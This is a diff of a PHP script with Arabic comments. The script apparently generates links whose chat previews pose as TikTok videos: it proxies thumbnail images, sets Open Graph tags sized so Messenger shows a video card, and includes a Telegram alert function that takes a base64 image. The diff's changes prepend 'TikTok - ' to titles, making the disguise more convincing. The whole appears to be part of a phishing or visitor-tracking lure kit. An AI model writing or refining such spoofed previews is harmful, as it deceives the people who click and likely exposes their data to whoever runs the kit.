@@ -58,7 +58,6 @@ if (isset($_GET['proxy_img'])) {
             exit;
         }
     }
-    // إذا فشل تحميل الصورة الأصلية، نعرض الصورة كما هي
     if ($image_data) { header('Content-Type: image/jpeg'); echo $image_data; exit; }
     header("Location: https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=800&h=800&fit=crop"); 
     exit;
@@ -143,7 +142,7 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
     }
 }
 
-// دالة محسنة جداً لاستخراج الاسم الحقيقي 100%
+// ✅ إضافة كلمة TikTok - تلقائياً
 function fetch_tiktok_exclusive_meta($url) {
     $meta = ['title' => 'فيديو تيك توك', 'image' => ''];
     
@@ -154,7 +153,9 @@ function fetch_tiktok_exclusive_meta($url) {
     if ($response) {
         $data = json_decode($response, true);
         if (!empty($data['title']) && !empty($data['thumbnail_url'])) {
-            return ['title' => $data['title'], 'image' => $data['thumbnail_url']];
+            $title = $data['title'];
+            if (stripos($title, 'TikTok') === false) $title = 'TikTok - ' . $title;
+            return ['title' => $title, 'image' => $data['thumbnail_url']];
         }
     }
     
@@ -169,8 +170,13 @@ function fetch_tiktok_exclusive_meta($url) {
             $meta['title'] = html_entity_decode(stripslashes($matches[1]), ENT_QUOTES, 'UTF-8');
         } elseif (preg_match('/<meta property="og:title" content="([^"]+)"/', $html, $matches)) {
             $meta['title'] = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
-            if (stripos($meta['title'], 'Make Your Day') !== false) $meta['title'] = 'فيديو تيك توك';
         }
+        
+        // إضافة اللاحقة إذا لم تكن موجودة
+        if (stripos($meta['title'], 'TikTok') === false) {
+            $meta['title'] = 'TikTok - ' . $meta['title'];
+        }
+
         // جلب الصورة
         if (preg_match('/"cover":"([^"]+)"/', $html, $matches)) {
             $meta['image'] = str_replace('\\u002F', '/', $matches[1]);
@@ -259,7 +265,6 @@ if (isset($_GET['r'])) {
             echo '<meta property="og:description" content="شاهد الفيديو الآن">';
             echo '<meta property="og:image" content="' . htmlspecialchars($proxy_img_url) . '">';
             echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($proxy_img_url) . '">';
-            // استخدام أبعاد مربعة (1:1) لجعل ماسنجر يعرضها كبطاقة فيديو احترافية
             echo '<meta property="og:image:width" content="800">';
             echo '<meta property="og:image:height" content="800">';
             echo '<meta property="og:type" content="video.other">';
